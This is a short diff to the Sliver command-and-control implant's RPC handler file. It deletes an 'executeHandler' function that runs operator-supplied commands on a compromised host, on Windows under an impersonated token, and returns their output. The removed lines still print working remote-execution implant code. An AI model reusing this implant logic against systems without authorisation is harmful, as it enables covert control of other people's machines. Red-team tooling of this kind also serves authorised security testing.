+++ implant/sliver/handlers/generic-rpc-handlers.go
@@ -23,7 +23,6 @@ package handlers
 import (
 	"fmt"
 	"net"
-	"os/exec"
 	"strings"
 
 	// {{if .Config.Debug}}
@@ -31,10 +30,6 @@ import (
 	// {{end}}
 
 	// {{if eq .Config.GOOS "windows"}}
-	"syscall"
-
-	"github.com/bishopfox/sliver/implant/sliver/priv"
-	"golang.org/x/sys/windows"
 
 	// {{end}}
 
@@ -215,56 +210,6 @@ func ifconfig() *sliverpb.Ifconfig {
 		interfaces.NetInterfaces = append(interfaces.NetInterfaces, netIface)
 	}
 	return interfaces
-}
-
-func executeHandler(data []byte, resp RPCResponse) {
-	var (
-		err error
-	)
-	execReq := &sliverpb.ExecuteReq{}
-	err = proto.Unmarshal(data, execReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-
-	execResp := &sliverpb.Execute{}
-	cmd := exec.Command(execReq.Path, execReq.Args...)
-
-	//{{if eq .Config.GOOS "windows"}}
-	cmd.SysProcAttr = &windows.SysProcAttr{
-		Token: syscall.Token(priv.CurrentToken),
-	}
-	//{{end}}
-
-	if execReq.Output {
-		res, err := cmd.CombinedOutput()
-		//{{if .Config.Debug}}
-		log.Println(string(res))
-		//{{end}}
-		if err != nil {
-			// Exit errors are not a failure of the RPC, but of the command.
-			if exiterr, ok := err.(*exec.ExitError); ok {
-				execResp.Status = uint32(exiterr.ExitCode())
-			} else {
-				execResp.Response = &commonpb.Response{
-					Err: fmt.Sprintf("%s", err),
-				}
-			}
-		}
-		execResp.Result = string(res)
-	} else {
-		err = cmd.Start()
-		if err != nil {
-			execResp.Response = &commonpb.Response{
-				Err: fmt.Sprintf("%s", err),
-			}
-		}
-	}
-	data, err = proto.Marshal(execResp)
-	resp(data, err)
 }
 
 func screenshotHandler(data []byte, resp RPCResponse) {
